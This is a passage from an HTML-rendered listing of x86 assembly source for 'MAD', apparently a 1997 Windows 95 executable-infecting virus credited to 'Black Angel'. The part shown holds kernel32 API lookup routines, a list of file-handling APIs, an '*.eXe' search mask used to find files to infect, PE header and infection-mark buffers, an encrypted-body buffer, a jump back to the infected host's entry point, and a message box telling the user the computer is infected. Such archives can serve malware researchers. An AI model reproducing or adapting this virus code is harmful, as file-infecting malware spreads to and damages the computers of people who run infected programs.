       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">SaveEBP</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">HostEntry</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">extract_addr</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                                </span><span class="sc1">;is api we want?</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_func</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pAPIRVA</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelBase</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelBase</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;set adress</span><span class="sc0">
</span><span class="sc5">no_func</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">get_api_addr</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pGetProcAddress</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">proc_found</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                       </span><span class="sc1">;set carry on error</span><span class="sc0">
</span><span class="sc5">proc_found</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">KernelBase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pAPIRVA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">pGetProcAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szGetProcAddres</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">                           </span><span class="sc1">;size of string to search</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">pGetModuleHdle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szGetModuleHdle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">                           </span><span class="sc1">;size of string to search</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_Kernel32</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_User32</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'USER32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_MsgBox</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;this one we get from user32</span><span class="sc0">

</span><span class="sc5">_FFile</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;and all these otherz from</span><span class="sc0">
</span><span class="sc5">_CreateFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;kernel32</span><span class="sc0">
</span><span class="sc5">_CloseFile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ReadFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_WriteFile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FileSeek</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FNFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetTime</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetLocalTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SetDir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetDir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">KernelHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;also used for USER32.DLL</span><span class="sc0">
                                                 </span><span class="sc1">;when using payload</span><span class="sc0">

</span><span class="sc5">MsgTitle</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Multiplatform Advanced Destroyer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MsgText</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Hello user your computer is infected by MAD virus'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Welcome to my first virus for Windoze95...'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Distribution &amp; Copyright by Black Angel 1997'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                                 </span><span class="sc1">;uhh... a confession... ;-)</span><span class="sc0">

</span><span class="sc5">ExeMask</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.eXe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[MAD for Win95] version 1.0 BETA! (c)Black Angel`97'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DotDot</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                 </span><span class="sc1">;for directory changing</span><span class="sc0">

</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NumRead</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Seed</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SYSTIME</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">cYear</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cMonth</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cDWeek</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cDay</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cHour</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cMin</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cSec</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cMlSec</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FINDATA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;File Attribute</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;Creation Date</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;Last Acess Date</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;Last Write Date</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;File Size h</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;File Size l</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;Reserved</span><span class="sc0">
</span><span class="sc5">Security</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FileName2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">PEPointer</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TotalInf</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">PEHeader</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;from here to end, are all</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;bufferz that w95.mad.2736</span><span class="sc0">
</span><span class="sc5">NumberSections</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;use for read, encription</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">;and like...</span><span class="sc0">
</span><span class="sc5">EntryRVA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FileAlign</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ObjAlign</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">InfectionMark</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EncriptedBody</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A4h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">szRVA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pRAW</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szRAW</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ObjAttr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">608Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
